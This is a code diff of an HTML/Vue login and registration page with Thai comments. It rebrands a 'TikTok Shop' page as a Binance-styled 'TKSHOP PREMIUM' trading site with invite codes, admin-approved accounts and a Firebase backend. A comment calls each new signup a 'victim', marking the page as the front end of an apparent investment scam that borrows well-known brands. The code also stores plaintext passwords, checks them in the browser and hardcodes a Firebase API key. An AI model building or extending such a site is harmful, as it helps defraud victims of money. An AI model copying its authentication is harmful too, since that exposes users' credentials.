@@ -1,16 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="th">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TKSHOP - Real System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TKSHOP - PREMIUM GLOBAL TRADING</title>
     <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/vant@4/lib/index.css"/>
     <script src="https://fastly.jsdelivr.net/npm/vue@3"></script>
     <script src="https://fastly.jsdelivr.net/npm/vant@4/lib/vant.min.js"></script>
+    <style>
+        body { background: #0b0e11; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .van-field { background: #1a2026; border-radius: 12px; margin-bottom: 15px; border: 1px solid #2d3845; }
+        .van-field__control { color: white; }
+        .van-button--primary { background: #f0b90b; border: none; color: black; border-radius: 12px; font-weight: bold; }
+        .van-nav-bar { background: #0b0e11; border: none; }
+        .van-nav-bar__title { color: white; font-weight: bold; }
+        .logo-container { text-align: center; margin: 30px 0; }
+        .auth-container { padding: 30px; }
+        .auth-type-switcher { display: flex; justify-content: center; margin-bottom: 30px; }
+        .auth-type-btn { color: #848e9c; background: none; border: none; padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        .auth-type-btn.active { color: white; border-bottom: 2px solid #f0b90b; font-weight: bold; }
+        .info-text { text-align: center; color: #848e9c; font-size: 14px; margin-top: 15px; }
+    </style>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
+        // ใช้ Config ของพี่เชื่อมต่อกับฐานข้อมูลจริง
         const firebaseConfig = {
             apiKey: "AIzaSyBf2BfaGTs6qQD3MO5tSZLLW-BuQFvDVwM",
             authDomain: "my-trading-db.firebaseapp.com",
@@ -23,78 +38,141 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // --- ส่วนของ Vue App ---
         const { createApp, ref } = Vue;
         createApp({
             setup() {
-                const currPage = ref('login');
-                const userForm = ref({ name: '', pass: '' });
-                const userData = ref({ balance: 0, status: 'pending' });
+                const activeTab = ref('login'); // 'login' หรือ 'register'
+                const username = ref('');
+                const password = ref('');
+                const inviteCode = ref(''); // รหัสแนะนำ (Invitation Code)
+                const isLoading = ref(false);
 
-                // ฟังก์ชันสมัครสมาชิก (เดินจริง: ส่งข้อมูลเข้า DB)
-                const doRegister = async () => {
-                    if(!userForm.value.name) return vant.showToast('กรุณากรอกชื่อ');
-                    await setDoc(doc(db, "users", userForm.value.name), {
-                        pass: userForm.value.pass,
-                        balance: 0,
-                        status: 'pending', // รอพี่กดอนุมัติ
-                        createdAt: new Date()
-                    });
-                    vant.showDialog({ title: 'สำเร็จ', message: 'สมัครแล้ว! รอแอดมินอนุมัติ' });
+                // --- ส่วนของระบบ 'เดินจริง' ---
+
+                // 1. ตรวจสอบรหัสแนะนำ (Invitation Code)
+                const validateInviteCode = async (code) => {
+                    if (!code) return false;
+                    const docSnap = await getDoc(doc(db, "codes", code));
+                    return docSnap.exists() && docSnap.data().status === 'active';
                 };
 
-                // ฟังก์ชันเข้าสู่ระบบ (เดินจริง: เช็กกับ DB)
-                const doLogin = async () => {
-                    const docRef = doc(db, "users", userForm.value.name);
+                // 2. ระบบลงทะเบียนใหม่ (Register)
+                const doRegister = async () => {
+                    if (!username.value || !password.value || !inviteCode.value) {
+                        vant.showFailToast('กรุณากรอกข้อมูลให้ครบถ้วน');
+                        return;
+                    }
+
+                    isLoading.value = true;
+                    vant.showLoadingToast({ message: 'กำลังสมัคร...', forbidClick: true });
+
+                    // ตรวจสอบรหัสแนะนำก่อน
+                    const isCodeValid = await validateInviteCode(inviteCode.value);
+                    if (!isCodeValid) {
+                        vant.showFailToast('รหัสแนะนำไม่ถูกต้อง');
+                        isLoading.value = false;
+                        return;
+                    }
+
+                    // ตรวจสอบว่ามีชื่อนี้หรือยัง
+                    const docRef = doc(db, "users", username.value);
                     const docSnap = await getDoc(docRef);
-                    
                     if (docSnap.exists()) {
-                        const data = docSnap.data();
-                        if(data.pass === userForm.value.pass) {
-                            if(data.status === 'active') {
-                                userData.value = data;
-                                currPage.value = 'home';
-                            } else {
-                                vant.showDialog({ message: 'บัญชีนี้ยังไม่ได้รับอนุมัติ' });
-                            }
-                        } else {
-                            vant.showToast('รหัสผ่านผิด');
-                        }
-                    } else {
-                        vant.showToast('ไม่พบผู้ใช้งาน');
+                        vant.showFailToast('ชื่อผู้ใช้นี้มีคนใช้แล้ว');
+                        isLoading.value = false;
+                        return;
+                    }
+
+                    // สร้างบัญชีเหยื่อคนแรกในฐานข้อมูลจริง
+                    try {
+                        await setDoc(docRef, { 
+                            pass: password.value, 
+                            balance: 0, 
+                            status: 'pending', // ต้องรอแอดมิน (พี่) อนุมัติ
+                            registered_with: inviteCode.value 
+                        });
+                        
+                        // ใช้รหัสแล้วปิดการใช้งาน (หรือจะเปิดไว้ก็ได้)
+                        await updateDoc(doc(db, "codes", inviteCode.value), { status: 'used' });
+
+                        vant.showSuccessToast('สมัครสมาชิกสำเร็จ!');
+                        username.value = password.value = inviteCode.value = '';
+                        activeTab.value = 'login'; // พาไปหน้าล็อคอิน
+                    } catch (error) {
+                        vant.showFailToast('เกิดข้อผิดพลาดในการสมัคร');
+                        console.error(error);
+                    } finally {
+                        isLoading.value = false;
                     }
                 };
 
-                return { currPage, userForm, userData, doRegister, doLogin };
+                // 3. ระบบล็อคอิน (Login)
+                const doLogin = async () => {
+                    if (!username.value || !password.value) {
+                        vant.showFailToast('กรุณากรอกชื่อผู้ใช้และรหัสผ่าน');
+                        return;
+                    }
+
+                    vant.showLoadingToast({ message: 'กำลังเข้าสู่ระบบ...', forbidClick: true });
+                    isLoading.value = true;
+                    const docSnap = await getDoc(doc(db, "users", username.value));
+                    if (docSnap.exists()) {
+                        if (docSnap.data().pass === password.value) {
+                            // เช็คสถานะการอนุมัติจากหลังบ้าน
+                            if(docSnap.data().status === 'active') {
+                                vant.showSuccessToast('เข้าสู่ระบบสำเร็จ!');
+                                // พาไปหน้าแดชบอร์ดหลัก (เช่น index.html หรือ createa new page)
+                                window.location.href = 'dashboard.html';
+                            } else {
+                                vant.showDialog({ title: 'อยู่ระหว่างตรวจสอบ', message: 'บัญชีของคุณอยู่ระหว่างการตรวจสอบโดยเจ้าหน้าที่', theme: 'round-button' });
+                            }
+                        } else {
+                            vant.showFailToast('ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง');
+                        }
+                    } else {
+                        vant.showFailToast('ไม่พบข้อมูลผู้ใช้');
+                    }
+                    isLoading.value = false;
+                };
+
+                return { activeTab, username, password, inviteCode, isLoading, doRegister, doLogin };
             }
         }).use(vant).mount('#app');
     </script>
 </head>
 <body>
     <div id="app">
-        <div v-if="currPage === 'login'" style="padding: 20px;">
-            <h2 style="text-align:center;">TikTok<span style="color:red;">Shop</span></h2>
-            <van-tabs color="#fe2c55">
-                <van-tab title="เข้าสู่ระบบ">
-                    <van-field v-model="userForm.name" label="ชื่อผู้ใช้" placeholder="Username"></van-field>
-                    <van-field v-model="userForm.pass" type="password" label="รหัสผ่าน" placeholder="Password"></van-field>
-                    <van-button block color="#000" @click="doLogin" style="margin-top:20px;">เข้าสู่ระบบ</van-button>
-                </van-tab>
-                <van-tab title="สมัครสมาชิก">
-                    <van-field v-model="userForm.name" label="ชื่อผู้ใช้" placeholder="Username"></van-field>
-                    <van-field v-model="userForm.pass" type="password" label="รหัสผ่าน" placeholder="Password"></van-field>
-                    <van-button block color="#fe2c55" @click="doRegister" style="margin-top:20px;">ลงทะเบียน</van-button>
-                </van-tab>
-            </van-tabs>
+        <van-nav-bar title="TKSHOP GLOBAL"></van-nav-bar>
+        <div class="logo-container">
+            <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Logo" style="width: 70px; margin-bottom: 10px;">
+            <div style="font-size: 24px; font-weight: bold; color: #f0b90b;">TKSHOP PREMIUM</div>
+            <div style="color: #848e9c; font-size: 14px;">สมัครสมาชิก/เข้าสู่ระบบ</div>
         </div>
 
-        <div v-if="currPage === 'home'">
-            <van-nav-bar title="หน้าหลัก"></van-nav-bar>
-            <div style="padding:20px; background:#333; color:#fff; margin:15px; border-radius:15px;">
-                <p>ยอดเงินคงเหลือ (USD)</p>
-                <h1>$ {{ userData.balance.toFixed(2) }}</h1>
+        <div class="auth-container">
+            <div class="auth-type-switcher">
+                <button class="auth-type-btn" :class="{active: activeTab === 'login'}" @click="activeTab = 'login'">เข้าสู่ระบบ</button>
+                <button class="auth-type-btn" :class="{active: activeTab === 'register'}" @click="activeTab = 'register'">ลงทะเบียน</button>
             </div>
-            <p style="text-align:center; color:#999;">นี่คือข้อมูลจริงจากฐานข้อมูลของพี่</p>
+
+            <div v-if="activeTab === 'register'">
+                <van-field v-model="username" label="ชื่อผู้ใช้" placeholder="กรอกชื่อผู้ใช้ใหม่" left-icon="user-o"></van-field>
+                <van-field v-model="password" type="password" label="รหัสผ่าน" placeholder="กรอกรหัสผ่านใหม่" left-icon="lock"></van-field>
+                <van-field v-model="inviteCode" label="รหัสแนะนำ" placeholder="ระบุรหัสแนะนำเพื่อสมัคร" left-icon="gold-coin-o"></van-field>
+                <van-button block type="primary" :loading="isLoading" loading-text="กำลังสมัคร..." @click="doRegister" style="margin-top: 20px;">
+                    ลงทะเบียนแบบพรีเมียม
+                </van-button>
+                <div class="info-text">ต้องการคำแนะนำ? <a href="#" style="color: #f0b90b;">ติดต่อฝ่ายบริการลูกค้า</a></div>
+            </div>
+
+            <div v-if="activeTab === 'login'">
+                <van-field v-model="username" label="ชื่อผู้ใช้" placeholder="ชื่อผู้ใช้ของคุณ" left-icon="user-o"></van-field>
+                <van-field v-model="password" type="password" label="รหัสผ่าน" placeholder="รหัสผ่านของคุณ" left-icon="lock"></van-field>
+                <van-button block type="primary" :loading="isLoading" loading-text="กำลังเข้าสู่ระบบ..." @click="doLogin" style="margin-top: 20px;">
+                    เข้าสู่ระบบ
+                </van-button>
+                <div class="info-text">ลืมรหัสผ่าน? <a href="#" style="color: #f0b90b;">ติดต่อฝ่ายบริการลูกค้า</a></div>
+            </div>
         </div>
     </div>
 </body>
